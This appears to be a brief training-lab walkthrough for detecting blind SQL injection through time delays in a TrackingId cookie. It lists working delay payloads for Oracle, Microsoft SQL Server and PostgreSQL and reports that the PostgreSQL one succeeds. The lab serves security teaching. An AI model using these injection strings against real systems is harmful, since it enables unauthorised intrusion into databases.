# Lab: Blind SQL injection with time delays

Intercept a page and find the TrackingId cookie.

Try several queries for different DBs, appending to the end of the cookie before the `;`

Oracle: `'||dbms_pipe.receive_message(('a'),10)--`
Microsoft: `'+WAITFOR DELAY '0:0:10'--`
PostgreSQL: `'||pg_sleep(10)--`

PostgreSQL works, indicating the database type and proving the vulnerability exists.